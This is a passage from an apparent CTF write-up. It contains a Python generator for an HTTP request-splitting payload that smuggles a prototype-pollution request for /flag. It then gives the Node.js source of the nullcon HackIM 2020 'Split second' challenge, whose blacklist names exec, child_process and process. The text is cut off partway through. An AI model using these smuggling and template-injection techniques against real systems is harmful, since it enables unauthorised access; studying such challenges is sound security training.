&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> &lt;span style="color:#111">requests.utils&lt;/span> &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">quote&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">_payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;amiz HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: 127.0.0.1:3000
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: keep-alive
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">GET /save?]=switch&amp;amp;sandbox=__proto__&amp;amp;opath=/flag&amp;amp;spath=/app/tmp/c74e4def8b621891bc34c84bca9b2a76&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">_payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\r\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">chr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">int&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;0xff&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">hex&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">ord&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">))[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">:]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">zfill&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="nullcon-hackim2020split-second">[nullcon HackIM2020]Split second&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-js" data-lang="js">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">//node 8.12.0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">express&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;express&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">express&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;fs&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">path&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;path&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">http&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">require&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/index.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/source&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">sendFile&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">path&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">join&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">__dirname&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#39;/source.html&amp;#39;&lt;/span>&lt;span style="color:#111">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/getMeme&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;lt;iframe src=&amp;#34;https://giphy.com/embed/LLHkw7UnvY3Kw&amp;#34; width=&amp;#34;480&amp;#34; height=&amp;#34;480&amp;#34; frameBorder=&amp;#34;0&amp;#34; class=&amp;#34;giphy-embed&amp;#34; allowFullScreen&amp;gt;&amp;lt;/iframe&amp;gt;&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;https://giphy.com/gifs/kid-dances-jumbotron-LLHkw7UnvY3Kw&amp;#34;&amp;gt;via GIPHY&amp;lt;/a&amp;gt;&amp;lt;/p&amp;gt;&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">ip&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">connection&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">remoteAddress&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">ip&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">includes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;127.0.0.1&amp;#39;&lt;/span>&lt;span style="color:#111">))&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;adminauth&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">pug2&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">decodeURI&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">headers&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;pug&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">/[a-z]/g&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">x&lt;/span>&lt;span style="color:#111">){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">authheader&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;secretpassword&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">html&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">pug&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">pug2&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;No characters&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;You need to come from localhost&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">app&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;/core&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">q&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">req&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">query&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">resp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">q&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">url&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;http://localhost:8081/getMeme?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#75af00">q&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">trigger&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;p&amp;gt;Errrrr, You have been Blocked&amp;lt;/p&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">http&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">setEncoding&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;utf8&amp;#39;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">err&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">code&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;ECONNRESET&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Timeout occurs&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resp&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;data&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">resps&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">chunk&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">resps&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}).&lt;/span>&lt;span style="color:#75af00">on&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;error&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">=&amp;gt;&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">e&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">message&lt;/span>&lt;span style="color:#111">);});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">});&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">console&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">log&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">error&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">res&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">send&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;search param &amp;#39;q&amp;#39; missing!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">blacklist&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">url&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">var&lt;/span> &lt;span style="color:#75af00">evilwords&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;\&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span 